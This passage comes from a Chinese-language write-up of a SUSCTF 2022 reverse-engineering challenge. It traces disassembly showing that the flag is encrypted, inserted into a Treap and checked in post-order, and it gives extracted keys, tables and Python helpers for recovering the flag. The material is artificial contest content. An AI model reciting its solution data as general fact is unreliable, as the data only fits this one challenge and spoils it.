(RDX + <span class="number">97</span>)  <span class="comment"># RCX的数据恰好是RDX + 97    </span></span><br><span class="line">RCX = RAX + RCX  <span class="comment"># RCX = 0XC1 + 0X31 == 0XF2</span></span><br><span class="line">RAX = RCX <span class="comment"># RAX = 0XF2</span></span><br><span class="line">EAX + i(index)  <span class="comment"># EAX = EAX + 0(第一次是0) EAX = (0XF2 + 0) EAX = 0XF2</span></span><br><span class="line">RCX = i</span><br><span class="line">mov dword ptr ss:[rsp+rcx*<span class="number">4</span>+<span class="number">0x40</span>], eax<span class="comment"># 把算好的EAX放到了某个固定的位置 放在了栈中，是个局部变量</span></span><br><span class="line"></span><br><span class="line">....   </span><br><span class="line">000000014001C2D6 | <span class="number">48</span>:83F8 <span class="number">28</span>                        | cmp rax,<span class="number">0x28</span><span class="comment"># 通过这里可以看出flag的长度是40位，除去SUSCTF&#123;&#125; ，中间的是32位</span></span><br><span class="line">.....      </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将EDX里面的值提取出来，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x62</span>, <span class="number">0x03</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x12</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>, <span class="number">0x14</span>, <span class="number">0x4F</span>,</span><br><span class="line">       <span class="number">0x5B</span>, <span class="number">0x2D</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x5F</span>, <span class="number">0x1D</span>, <span class="number">0x48</span>, <span class="number">0x1F</span>, <span class="number">0x67</span>, <span class="number">0x44</span>, <span class="number">0x3B</span>, <span class="number">0x37</span>]</span><br></pre></td></tr></table></figure><p>可以发现，只要把加密后的enc_flag执行 <code>flag  = [enc_flag[i] - key[i] - 97 - i for i in range(32)]</code> 就可以得到flag了</p><p>继续F7运行, 提取出有效的汇编指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证完长度是40后</span></span><br><span class="line"><span class="comment"># 初始位置XXXX</span></span><br><span class="line">mov dword ptr ss:[rsp+<span class="number">0x24</span>], <span class="number">0x0</span></span><br><span class="line">cmp dword ptr ss:[rsp+<span class="number">0x24</span>], <span class="number">0x20</span><span class="comment"># i &lt; 32?# 地址是00000001400158B8</span></span><br><span class="line"> </span><br><span class="line">movsxd rax, dword ptr ss:[rsp+<span class="number">0x24</span>]</span><br><span class="line">mov edx, dword ptr ss:[rsp+rax*<span class="number">4</span>+<span class="number">0x40</span>]<span class="comment"># 取加密后的input</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073B0</span>]</span><br><span class="line">mov dword ptr ss:[rsp+<span class="number">0x10</span>], edx </span><br><span class="line">mov qword ptr ss:[rsp+<span class="number">0x8</span>], rcx    <span class="comment"># 00000001400073B0</span></span><br><span class="line">sub rsp, <span class="number">0x28</span></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment">#  取出 00000001400073B0 给rax</span></span><br><span class="line">cmp dword ptr ds:[rax], <span class="number">0x0</span><span class="comment"># 地址是：0000000140002A7D</span></span><br><span class="line">je <span class="number">0x00000001400122FE</span>  <span class="comment"># 第一次是跳</span></span><br><span class="line"><span class="comment">#****************************************************这是跳的情况****************************************************</span></span><br><span class="line">mov eax, dword ptr ds:[<span class="number">0x00000001400073B8</span>]   <span class="comment"># 初始值是0</span></span><br><span class="line">inc eax</span><br><span class="line">mov dword ptr ds:[<span class="number">0x00000001400073B8</span>], eax <span class="comment"># [0x00000001400073B8]++</span></span><br><span class="line">    </span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment">#  取出 00000001400073B0 给rax   </span></span><br><span class="line">mov ecx, dword ptr ds:[<span class="number">0x00000001400073B8</span>]    </span><br><span class="line">mov dword ptr ds:[rax], ecx<span class="comment"># 就是把[0x00000001400073B8] --&gt; [0x00000001400073B0]</span></span><br><span class="line"></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 取出 00000001400073B0 给 rax</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]</span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line"></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0x14</span>], <span class="number">0x1</span></span><br><span class="line">    </span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 取出 00000001400073B0 给rax</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]</span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0xC</span>], <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 取出 00000001400073B0 给rax</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]   </span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">    </span><br><span class="line">mov edx,dword ptr ss:[rsp+<span class="number">0x38</span>]        <span class="comment">#  地址时: 0000000140016535 | 8B5424 38        取出EDX，即前面的加密后的input</span></span><br><span class="line">mov dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0x8</span>], edx</span><br><span class="line"></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 取出  00000001400073B0 给 RAX</span></span><br><span class="line">mov eax, dword ptr ds:[rax]</span><br><span class="line">add eax, <span class="number">0x6</span></span><br><span class="line"></span><br><span class="line">lea rcx, ds:[<span class="number">0x000000014000E1B0</span>]<span class="comment"># 0x000000014000E1B0是输入的原始flag的全局位置</span></span><br><span class="line">movsx eax, byte ptr ds:[rcx+rax*<span class="number">1</span>]<span class="comment"># 取出 0x31 (&#x27;1&#x27;) 这是自己输入的</span></span><br><span class="line">mov rcx, qword ptr ss:[rsp+<span class="number">0x30</span>]    <span class="comment"># 00000001400073B0 给 rcx</span></span><br><span class="line">movsxd rcx, dword ptr ds:[rcx]</span><br><span class="line">imul rcx, rcx, <span class="number">0x1C</span></span><br><span class="line"></span><br><span class="line">lea rdx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov dword ptr ds:[rdx+rcx*<span class="number">1</span>+<span class="number">0x18</span>], eax<span class="comment"># 把加密后的那个Input放到那个内存位置，像是一个结构体</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">##### 暂时不知道这一段是啥意思(乘 0xbc8f) % 0x7FFFFFFF    谷歌搜到 # https://rvklein.me/proj/rando/rando-code.html</span></span><br><span class="line">movsxd rax, dword ptr ds:[<span class="number">0x00000001400062C0</span>]<span class="comment"># 0x00000001400062C0的初始值是 0x1DF2ED66   # 本条指令地址是000000014001ABCC </span></span><br><span class="line">imul rax, rax, <span class="number">0xBC8F</span><span class="comment">#0000185591BAFD68</span></span><br><span class="line">mov ecx, <span class="number">0x7FFFFFFF</span></span><br><span class="line">idiv rcx<span class="comment"># 第二轮 RAX: 00000000000030AB RDX 0000000011BB2E13(余数)  这里是生成优先级，使其二叉搜索树满足堆的性质</span></span><br><span class="line">mov rax, rdx</span><br><span class="line">mov dword ptr ds:[<span class="number">0x00000001400062C0</span>], eax</span><br><span class="line">mov eax, dword ptr ds:[<span class="number">0x00000001400062C0</span>]</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line"></span><br><span class="line">movsxd rcx, dword ptr ds:[<span class="number">0x00000001400073B4</span>]</span><br><span class="line">lea rdx, ds:[<span class="number">0x0000000140007220</span>]</span><br><span class="line">mov dword ptr ds:[rdx+rcx*<span class="number">4</span>], eax  <span class="comment"># 000000002109B018</span></span><br><span class="line"></span><br><span class="line">movsxd rax, dword ptr ds:[<span class="number">0x00000001400073B4</span>]</span><br><span class="line">lea rcx, ds:[<span class="number">0x0000000140007220</span>]</span><br><span class="line">mov rdx, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 00000001400073B0 给 rdx</span></span><br><span class="line">    </span><br><span class="line">movsxd rdx, dword ptr ds:[rdx]</span><br><span class="line">imul rdx, rdx, <span class="number">0x1C</span></span><br><span class="line"></span><br><span class="line">lea r8, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov eax, dword ptr ds:[rcx+rax*<span class="number">4</span>]</span><br><span class="line">mov dword ptr ds:[r8+rdx*<span class="number">1</span>+<span class="number">0x10</span>], eax<span class="comment"># 000000002109B018</span></span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ds:[<span class="number">0x00000001400073B4</span>]</span><br><span class="line">inc eax</span><br><span class="line">mov dword ptr ds:[<span class="number">0x00000001400073B4</span>], eax</span><br><span class="line">add rsp, <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">mov eax, dword ptr ss:[rsp+<span class="number">0x24</span>]<span class="comment"># 一轮循环结束</span></span><br><span class="line">inc eax    </span><br><span class="line">mov dword ptr ss:[rsp+<span class="number">0x24</span>], eax</span><br><span class="line">    </span><br><span class="line">cmp dword ptr ss:[rsp+<span class="number">0x24</span>], <span class="number">0x20</span>  <span class="comment"># 回到了最上面的初始位置XXXX 地址：00000001400158B8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#****************************************************这是不跳的情况****************************************************</span></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 00000001400073B0# 地址是0000000140012B60</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]</span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line"> </span><br><span class="line">mov eax, dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0xC</span>]</span><br><span class="line">inc eax</span><br><span class="line"></span><br><span class="line">mov rcx, qword ptr ss:[rsp+<span class="number">0x30</span>]</span><br><span class="line">movsxd rcx, dword ptr ds:[rcx]    <span class="comment"># 00000001400073B0</span></span><br><span class="line">imul rcx, rcx, <span class="number">0x1C</span></span><br><span class="line">lea rdx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov dword ptr ds:[rdx+rcx*<span class="number">1</span>+<span class="number">0xC</span>], eax<span class="comment"># 变为了2</span></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 00000001400073B0</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]    </span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov edx, dword ptr ss:[rsp+<span class="number">0x38</span>]<span class="comment"># 取出enc_input</span></span><br><span class="line">  </span><br><span class="line">cmp dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0x8</span>], edx</span><br><span class="line">je <span class="number">0x0000000140011E04</span>   </span><br><span class="line"></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]</span><br><span class="line">movsxd rax, dword ptr ds:[rax]</span><br><span class="line">imul rax, rax, <span class="number">0x1C</span></span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">mov eax, dword ptr ds:[rcx+rax*<span class="number">1</span>+<span class="number">0x8</span>]<span class="comment"># 取出enc_input</span></span><br><span class="line">cmp dword ptr ss:[rsp+<span class="number">0x38</span>], eax</span><br><span class="line">jg <span class="number">0x0000000140017AF8</span></span><br><span class="line"></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment"># 00000001400073B0</span></span><br><span class="line">movsxd rax, dword ptr ds:[rax]</span><br><span class="line">imul rax, rax, <span class="number">0x1C</span>    </span><br><span class="line">lea rcx, ds:[<span class="number">0x00000001400073C0</span>]</span><br><span class="line">add rcx, rax</span><br><span class="line">mov rax, rcx</span><br><span class="line">mov edx, dword ptr ss:[rsp+<span class="number">0x38</span>]</span><br><span class="line">mov rcx, rax</span><br><span class="line">mov dword ptr ss:[rsp+<span class="number">0x10</span>], edx</span><br><span class="line">mov qword ptr ss:[rsp+<span class="number">0x8</span>], rcx    </span><br><span class="line">sub rsp, <span class="number">0x28</span></span><br><span class="line">mov rax, qword ptr ss:[rsp+<span class="number">0x30</span>]<span class="comment">#00000001400073DC</span></span><br><span class="line"></span><br><span class="line">cmp dword ptr ds:[rax], <span class="number">0x0</span></span><br><span class="line">je ****</span><br><span class="line">mov eax, dword ptr ds:[<span class="number">0x00000001400073B8</span>]</span><br><span class="line">inc eax   </span><br><span class="line"></span><br><span class="line">mov dword ptr ds:[<span class="number">0x00000001400073B8</span>], eax</span><br></pre></td></tr></table></figure><p>经过无尽的调试（在判断插入节点个数那里下断点，每插入一个节点，就把0x00000001400073B0那里的数据提取出来，进行比对）就会发现，程序是把输入的flag按照Treap的特性存放在了00000001400073C0处，这里是一个长度为33的结构体数组，(第一个数组全是0，因为序号是从1开始的，序号是0表示为空，有效的就是后面32个数组)每个单元的大小是0X1C</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220303101105891.png" class="" title="image-20220303101105891"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tree_node</span>&#123;</span></span><br><span class="line">   <span class="number">0x00</span> DWORD 左孩子; <span class="comment">//0表示空</span></span><br><span class="line">   <span class="number">0x04</span> DWORD 右孩子;</span><br><span class="line">   <span class="number">0X08</span> DWORD enc_input;<span class="comment">//加密后的每一个字符</span></span><br><span class="line">   <span class="number">0X0C</span> DWORD 叶子个数;    <span class="comment">//假设把此节点当做根节点，整个Tree的叶子个数</span></span><br><span class="line">   <span class="number">0X10</span> DWORD 随机数;    <span class="comment">//优先级</span></span><br><span class="line">   <span class="number">0X14</span> DWORD  <span class="number">1</span>; <span class="comment">//这个没搞懂啥意思</span></span><br><span class="line">   <span class="number">0X18</span> DWORD input; <span class="comment">//输入的flag的每一个字符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在00000001400073B0处存放着根节点，00000001400073B4, 00000001400073B8处存着当前树的所有叶子个数</p><p>输入<code>SUSCTF&#123;01234567890122345679abcdefghijkl&#125;</code>, 然后根据00000001400073C0处的数据画出自己输入的假的flag构造的二叉树</p><p>提取出00000001400073C0处有效的32个数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">00000000 00000013 000000F1 00000006 2109B018 00000001 00000030</span><br><span class="line">0000000F 00000009 000000D9 00000018 11BB2E13 00000001 00000031</span><br><span class="line">00000000 00000000 000000F7 00000001 5D64CABB 00000001 00000032</span><br><span class="line">00000000 0000000B 0000009A 00000002 302F1C09 00000001 00000033</span><br><span class="line">00000004 00000015 000000AF 00000020 02E78C02 00000001 00000034</span><br><span class="line">00000000 00000000 000000B4 00000001 2A28B165 00000001 00000035</span><br><span class="line">00000000 00000000 000000BB 00000001 6F018185 00000001 00000036</span><br><span class="line">00000000 00000006 000000B1 00000002 1CF5A8D1 00000001 00000037</span><br><span class="line">00000016 00000011 000000EE 0000000E 1532F368 00000001 00000038</span><br><span class="line">00000000 00000000 000000F4 00000001 42367652 00000001 00000039</span><br><span class="line">00000000 00000000 000000A0 00000001 7B50B157 00000001 00000030</span><br><span class="line">00000007 00000000 000000C2 00000002 244FA941 00000001 00000031</span><br><span class="line">00000000 00000000 000000D7 00000001 48CB7CCC 00000001 00000032</span><br><span class="line">0000000C 00000014 000000CF 00000004 1950F130 00000001 00000032</span><br><span class="line">00000008 00000012 000000B6 00000009 15561F1B 00000001 00000033</span><br><span class="line">00000000 0000000A 000000F3 00000002 29F35383 00000001 00000034</span><br><span class="line">00000001 00000020 00000101 0000000A 204017F9 00000001 00000035</span><br><span class="line">0000000E 0000000D 000000D5 00000006 15686F99 00000001 00000036</span><br><span class="line">00000010 0000001A 000000F6 00000005 274AD200 00000001 00000037</span><br><span class="line">00000000 00000000 000000D3 00000001 650387E1 00000001 00000039</span><br><span class="line">0000001B 00000019 00000130 0000001D 04C2B77D 00000001 00000061</span><br><span class="line">00000017 00000000 000000E7 00000003 278451D6 00000001 00000062</span><br><span class="line">00000000 00000018 000000DE 00000002 3F0318C0 00000001 00000063</span><br><span class="line">00000000 00000000 000000E3 00000001 78E83012 00000001 00000064</span><br><span class="line">00000000 0000001D 0000013D 00000002 0D00C42A 00000001 00000065</span><br><span class="line">00000003 00000000 000000FD 00000002 537C7E9D 00000001 00000066</span><br><span class="line">00000002 0000001E 0000012A 0000001A 0F8680AF 00000001 00000067</span><br><span class="line">00000000 00000000 00000103 00000001 72A27C9F 00000001 00000068</span><br><span class="line">00000000 00000000 0000014D 00000001 5C4909AF 00000001 00000069</span><br><span class="line">00000000 00000000 0000012C 00000001 2FE974B3 00000001 0000006A</span><br><span class="line">00000000 00000000 00000125 00000001 351BEA91 00000001 0000006B</span><br><span class="line">0000001C 0000001F 00000123 00000003 2ADAD13B 00000001 0000006C</span><br></pre></td></tr></table></figure><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220303102303800.png" class="" title="image-20220303102303800"><p>一点点调试就会发现这采用了后序遍历的方式去遍历这个二叉树，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">0000000140010DE3 | <span class="number">48</span>:<span class="number">6305</span> D265FFFF                  | movsxd rax,dword ptr ds:[<span class="number">0x1400073BC</span>]  | <span class="number">0x00000001400073BC</span> 是比对字符的个数，估计到了<span class="number">32</span>的时候就是成功的位置</span><br><span class="line">000000014001C1ED | <span class="number">48</span>:8D0D 4C9EFEFF                  | lea rcx,qword ptr ds:[<span class="number">0x140006040</span>]     | <span class="number">140006040</span>存放着后续遍历的真正的数据，需要找到索引才能还原      </span><br><span class="line">     ......</span><br><span class="line">0000000140014ED1 | <span class="number">394424</span> 2C                         | cmp dword ptr ss:[rsp+<span class="number">0x2C</span>],eax                           | 最终比较</span><br><span class="line">      ......</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将140006040处的数据提取出来，构造二叉树</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encs = [<span class="number">0x00A2</span>, <span class="number">0x00AF</span>, <span class="number">0x009D</span>, <span class="number">0x00B7</span>, <span class="number">0x00D2</span>, <span class="number">0x00CB</span>, <span class="number">0x00C7</span>, <span class="number">0x00C6</span>, <span class="number">0x00B0</span>, <span class="number">0x00D5</span>, <span class="number">0x00DA</span>, <span class="number">0x00E3</span>, <span class="number">0x00E6</span>, <span class="number">0x00E8</span>, <span class="number">0x00E9</span>, <span class="number">0x00F3</span>,</span><br><span class="line">        <span class="number">0x00F4</span>, <span class="number">0x00EF</span>, <span class="number">0x00EE</span>, <span class="number">0x00F7</span>, <span class="number">0x00F9</span>, <span class="number">0x00FF</span>, <span class="number">0x0101</span>, <span class="number">0x00F5</span>, <span class="number">0x0109</span>, <span class="number">0x011F</span>, <span class="number">0x011A</span>, <span class="number">0x0146</span>, <span class="number">0x0124</span>, <span class="number">0x010F</span>, <span class="number">0x0106</span>, <span class="number">0x00DF</span>]</span><br></pre></td></tr></table></figure><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220303103229887.png" class="" title="image-20220303102303800"><p>flag—&gt;加密–&gt;按照顺序插入–&gt;得到了这个二叉树，因此咱们现在只需要知道现在这个二叉树每个节点的索引，然后解密就可以得到原始的flag</p><p>在调试的过程中发现，如果当前比较的这个节点不是叶子节点的话，会对本节点和左孩子节点 ，本节点和右孩子节点 的关系进行验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比较的汇编代码在这</span></span><br><span class="line">000000014001B7B0 | <span class="number">48</span>:3914C1                         | cmp qword ptr ds:[rcx+rax*<span class="number">8</span>],rdx       | 比较右孩子</span><br><span class="line">      ......</span><br><span class="line">0000000140015993 | <span class="number">48</span>:3914C1                         | cmp qword ptr ds:[rcx+rax*<span class="number">8</span>],rdx       | 左孩子比较</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>这就是我们的突破口</p><ol><li><p>00000001400060C0 存放着本节点和左孩子节点的关系</p></li><li><p>00000001400061C0 存放着本节点和右孩子之间的关系</p></li></ol><p>这2个数据怎么用呢？调试发现是 <code>孩子节点序号 *0X17 + 本节点input = 关系s[本节点序号]</code>  因此我们要得到孩子节点序号的话，需要知道本节点的Input +  本节点的序号，然后用本节点序号去索引左孩子或右孩子关系s，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_child_xuhao</span>(<span class="params">node_c, gx</span>):</span></span><br><span class="line">    <span class="comment"># node_c： 本节点字符</span></span><br><span class="line">    <span class="comment"># gx: 关系</span></span><br><span class="line">    <span class="comment"># 孩子节点序号 * 0x17  + 本节点input = gx</span></span><br><span class="line">    <span class="keyword">if</span> (gx - node_c) % <span class="number">0x17</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>((gx - node_c) / <span class="number">0x17</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>因为Treap有堆的性质，根节点的优先级是最小的，因此我们提取出所有的优先级，对他进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x2109B018</span>, <span class="number">0x11BB2E13</span>, <span class="number">0x5D64CABB</span>, <span class="number">0x302F1C09</span>, <span class="number">0x02E78C02</span>, <span class="number">0x2A28B165</span>, <span class="number">0x6F018185</span>, <span class="number">0x1CF5A8D1</span>, <span class="number">0x1532F368</span>, <span class="number">0x42367652</span>, <span class="number">0x7B50B157</span>, <span class="number">0x244FA941</span>, <span class="number">0x48CB7CCC</span>, <span class="number">0x1950F130</span>, <span class="number">0x15561F1B</span>, <span class="number">0x29F35383</span>,</span><br><span class="line">     <span class="number">0x204017F9</span>, <span class="number">0x15686F99</span>, <span class="number">0x274AD200</span>, <span class="number">0x650387E1</span>, <span class="number">0x04C2B77D</span>, <span class="number">0x278451D6</span>, <span class="number">0x3F0318C0</span>, <span class="number">0x78E83012</span>, <span class="number">0x0D00C42A</span>, <span class="number">0x537C7E9D</span>, <span class="number">0x0F8680AF</span>, <span class="number">0x72A27C9F</span>, <span class="number">0x5C4909AF</span>, <span class="number">0x2FE974B3</span>, <span class="number">0x351BEA91</span>, <span class="number">0x2ADAD13B</span>]</span><br><span class="line">yxj = [[i, c[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_</span>(<span class="params">elem</span>):</span></span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yxj.sort(key=sort_)</span><br><span class="line"><span class="built_in">print</span>(yxj)</span><br><span class="line"><span class="comment"># [[4, 48729090], [20, 79869821], [24, 218154026], [26, 260473007], [1, 297479699], [8, 355660648], [14, 357965595], [17, 359165849], [13, 424735024], [7, 485861585], [16, 541071353], [0, 554283032], [11, 609200449], [18, 659214848], [21, 662983126], [15, 703812483], [5, 707309925], [31, 718983483], [29, 803828915], [3, 808393737], [30, 891021969], [22, 1057167552], [9, 1110865490], [12, 1221295308], [25, 1400667805], [28, 1548290479], [2, 1566886587], [19, 1694730209], [6, 1862369669], [27, 1923251359], [23, 2028482578], [10, 2068885847]]</span></span><br></pre></td></tr></table></figure><p>可以发现，索引是4，即序号是5的时候最小，即223的序号是5，根据5(序号)和223(enc_input)进行解密就可以得到本节点字符 ‘d’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_c</span>(<span class="params">_index, enc_input</span>):</span></span><br><span class="line">    <span class="comment"># 